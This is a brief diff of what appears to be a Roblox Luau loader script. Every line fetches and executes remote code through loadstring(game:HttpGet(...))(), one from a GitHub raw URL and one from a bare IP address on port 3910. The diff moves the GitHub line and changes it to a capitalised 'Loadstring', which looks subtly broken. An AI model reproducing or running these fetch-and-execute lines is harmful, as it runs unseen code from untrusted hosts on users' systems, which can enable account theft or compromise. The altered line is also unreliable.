@@ -1,3 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/UpdateZysume"))()
 ID="b9917829-9905-46ef-8800-f9fefc862deb";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+Loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/UpdateZysume"))()
